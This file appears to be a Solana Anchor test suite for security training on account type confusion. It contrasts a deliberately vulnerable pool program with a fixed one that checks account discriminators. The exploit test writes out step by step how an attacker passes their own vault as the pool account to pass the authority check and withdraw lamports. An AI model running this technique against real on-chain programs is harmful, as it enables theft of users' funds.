import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { assert } from "chai";
import { Keypair, PublicKey, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { PoolVulnerable } from "../target/types/pool_vulnerable";
import { PoolFixed } from "../target/types/pool_fixed";

/**
 * Account Confusion Vulnerability Test Suite ($50M Bug Class)
 * 
 * This test demonstrates one of the most critical vulnerabilities in Solana:
 * Account Type Confusion. This bug class has been responsible for exploits
 * totaling over $50 million, including the infamous Cashio hack.
 * 
 * The Attack:
 * 1. Protocol has Pool and UserVault accounts with similar memory layouts
 * 2. Admin withdrawal function accepts raw AccountInfo without type validation
 * 3. Attacker creates UserVault with their pubkey at the "authority" offset
 * 4. Attacker calls admin_withdraw, passing their UserVault as the "pool"
 * 5. Program deserializes UserVault data using Pool layout
 * 6. UserVault.owner is read as Pool.authority -> Attacker gains admin access!
 */
describe("09 - Account Confusion Vulnerability ($50M Bug Class)", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const programVuln = anchor.workspace.PoolVulnerable as Program<PoolVulnerable>;
  const programFixed = anchor.workspace.PoolFixed as Program<PoolFixed>;

  // Legitimate pool admin
  const admin = Keypair.generate();
  // Attacker
  const attacker = Keypair.generate();
  // Legitimate user
  const user = Keypair.generate();

  // PDAs for vulnerable program
  const [poolVuln] = PublicKey.findProgramAddressSync(
    [Buffer.from("pool")],
    programVuln.programId
  );
  
  const [attackerVaultVuln] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), attacker.publicKey.toBuffer()],
    programVuln.programId
  );
  
  const [userVaultVuln] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), user.publicKey.toBuffer()],
    programVuln.programId
  );

  // PDAs for fixed program
  const [poolFixed] = PublicKey.findProgramAddressSync(
    [Buffer.from("pool")],
    programFixed.programId
  );
  
  const [attackerVaultFixed] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), attacker.publicKey.toBuffer()],
    programFixed.programId
  );

  describe("Setup", () => {
    before(async () => {
      // Fund all accounts
      for (const kp of [admin, attacker, user]) {
        const airdrop = await provider.connection.requestAirdrop(
          kp.publicKey, 
          10 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdrop);
      }
    });

    it("should initialize vulnerable pool with admin", async () => {
      await programVuln.methods.initializePool()
        .accounts({
          pool: poolVuln,
          authority: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();

      const poolData = await programVuln.account.pool.fetch(poolVuln);
      assert.equal(poolData.authority.toString(), admin.publicKey.toString());
      
      console.log("\n  Vulnerable Pool Created:");
      console.log("    - Pool PDA:", poolVuln.toString().slice(0, 16) + "...");
      console.log("    - Authority:", admin.publicKey.toString().slice(0, 16) + "...");
    });

    it("should create legitimate user vault and deposit", async () => {
      // Create user vault
      await programVuln.methods.createUserVault()
        .accounts({
          userVault: userVaultVuln,
          owner: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user])
        .rpc();

      // Deposit funds
      await programVuln.methods.deposit(new anchor.BN(5 * LAMPORTS_PER_SOL))
        .accounts({
          pool: poolVuln,
          userVault: userVaultVuln,
          depositor: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user])
        .rpc();

      const poolData = await programVuln.account.pool.fetch(poolVuln);
      console.log("\n  User Deposited 5 SOL:");
      console.log("    - Pool liquidity:", poolData.totalLiquidity.toNumber() / LAMPORTS_PER_SOL, "SOL");
    });

    it("should create attacker vault and deposit (setting up the exploit)", async () => {
      // The attacker creates their own vault
      // Crucially, vault.owner = attacker.publicKey
      // This will be at offset 8-40, same as Pool.authority!
      
      await programVuln.methods.createUserVault()
        .accounts({
          userVault: attackerVaultVuln,
          owner: attacker.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      // Attacker deposits into their vault
      // This sets deposited_amount which is read as total_liquidity in the exploit
      await programVuln.methods.deposit(new anchor.BN(3 * LAMPORTS_PER_SOL))
        .accounts({
          pool: poolVuln,
          userVault: attackerVaultVuln,
          depositor: attacker.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      console.log("\n  Attacker Vault Created:");
      console.log("    - Vault PDA:", attackerVaultVuln.toString().slice(0, 16) + "...");
      console.log("    - Owner:", attacker.publicKey.toString().slice(0, 16) + "...");
      console.log("    - Deposited: 3 SOL (this becomes 'total_liquidity' in the exploit)");
      console.log("    - (vault.owner is at same offset as pool.authority!)");
    });
  });

  describe("Exploit: Account Type Confusion", () => {
    it("should allow attacker to drain vault by passing UserVault as Pool", async () => {
      console.log("\n  === EXECUTING EXPLOIT ===\n");
      
      // Fund the attacker's vault directly so it has lamports to drain
      // This simulates a scenario where vaults hold actual funds
      const fundVault = await provider.connection.requestAirdrop(
        attackerVaultVuln, 
        1 * LAMPORTS_PER_SOL
      );
      await provider.connection.confirmTransaction(fundVault);
      
      const vaultBalanceBefore = await provider.connection.getBalance(attackerVaultVuln);
      const attackerBalanceBefore = await provider.connection.getBalance(attacker.publicKey);
      
      console.log("  Before Attack:");
      console.log("    - Vault balance:", vaultBalanceBefore / LAMPORTS_PER_SOL, "SOL");
      console.log("    - Attacker balance:", attackerBalanceBefore / LAMPORTS_PER_SOL, "SOL");
      
      // THE EXPLOIT:
      // 1. Attacker calls admin_withdraw
      // 2. Passes their UserVault instead of the Pool
      // 3. Program deserializes UserVault using Pool layout
      // 4. UserVault.owner (attacker's pubkey) is read as Pool.authority
      // 5. Authority check passes because attacker IS signing
      // 6. Funds are transferred from the vault account to attacker!
      
      // The "total_liquidity" check reads deposited_amount from UserVault
      // which is 3 SOL (from earlier deposit), so this passes
      const stealAmount = new anchor.BN(0.5 * LAMPORTS_PER_SOL);
      
      await programVuln.methods.adminWithdraw(stealAmount)
        .accounts({
          pool: attackerVaultVuln, // EXPLOIT: Passing UserVault instead of Pool!
          authority: attacker.publicKey,
          recipient: attacker.publicKey,
        })
        .signers([attacker])
        .rpc();
      
      const vaultBalanceAfter = await provider.connection.getBalance(attackerVaultVuln);
      const attackerBalanceAfter = await provider.connection.getBalance(attacker.publicKey);
      
      console.log("\n  After Attack:");
      console.log("    - Vault balance:", vaultBalanceAfter / LAMPORTS_PER_SOL, "SOL");
      console.log("    - Vault drained:", (vaultBalanceBefore - vaultBalanceAfter) / LAMPORTS_PER_SOL, "SOL");
      console.log("    - Attacker gained:", (attackerBalanceAfter - attackerBalanceBefore) / LAMPORTS_PER_SOL, "SOL");
      
      // Verify the exploit worked
      assert.isTrue(vaultBalanceAfter < vaultBalanceBefore, "Vault should have less lamports");
      assert.isTrue(attackerBalanceAfter > attackerBalanceBefore, "Attacker should have gained lamports");
      
      console.log("\n  EXPLOIT SUCCESSFUL!");
      console.log("    - Attacker bypassed authority check using account confusion");
      console.log("    - Program read UserVault.owner as Pool.authority");
      console.log("    - In a real attack, victim's vault funds would be stolen");
    });
  });

  describe("Fixed Program: Discriminator Validation", () => {
    before(async () => {
      // Initialize fixed pool
      await programFixed.methods.initializePool()
        .accounts({
          pool: poolFixed,
          authority: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();

      // Create attacker vault
      await programFixed.methods.createUserVault()
        .accounts({
          userVault: attackerVaultFixed,
          owner: attacker.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      console.log("\n  Fixed Program Initialized");
    });

    it("should reject attacker passing UserVault as Pool", async () => {
      console.log("\n  Attempting same exploit on fixed program...");
      
      try {
        await programFixed.methods.adminWithdraw(new anchor.BN(1 * LAMPORTS_PER_SOL))
          .accounts({
            pool: attackerVaultFixed, // Try the same exploit
            authority: attacker.publicKey,
            recipient: attacker.publicKey,
          })
          .signers([attacker])
          .rpc();
          
        assert.fail("Should have rejected due to discriminator mismatch");
      } catch (err: any) {
        const errStr = JSON.stringify(err);
        const isSecurityError = 
          errStr.includes("AccountDiscriminatorMismatch") ||
          errStr.includes("Invalid account discriminator") ||
          errStr.includes("ConstraintSeeds") ||
          errStr.includes("AnchorError");
          
        assert.isTrue(isSecurityError, `Unexpected error: ${err.message}`);
        
        console.log("    - Transaction REJECTED");
        console.log("    - Reason: Account type validation failed");
        console.log("    - Account<'info, Pool> validates discriminator automatically");
      }
    });

    it("should allow legitimate admin to withdraw", async () => {
      // First deposit some funds
      const [userVaultFixed] = PublicKey.findProgramAddressSync(
        [Buffer.from("vault"), user.publicKey.toBuffer()],
        programFixed.programId
      );
      
      await programFixed.methods.createUserVault()
        .accounts({
          userVault: userVaultFixed,
          owner: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user])
        .rpc();

      await programFixed.methods.deposit(new anchor.BN(3 * LAMPORTS_PER_SOL))
        .accounts({
          pool: poolFixed,
          userVault: userVaultFixed,
          depositor: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user])
        .rpc();

      // Now admin withdraws
      await programFixed.methods.adminWithdraw(new anchor.BN(1 * LAMPORTS_PER_SOL))
        .accounts({
          pool: poolFixed,
          authority: admin.publicKey,
          recipient: admin.publicKey,
        })
        .signers([admin])
        .rpc();

      console.log("\n  LEGITIMATE OPERATION:");
      console.log("    - Admin successfully withdrew 1 SOL");
      console.log("    - Using actual Pool account with matching discriminator");
    });
  });
});
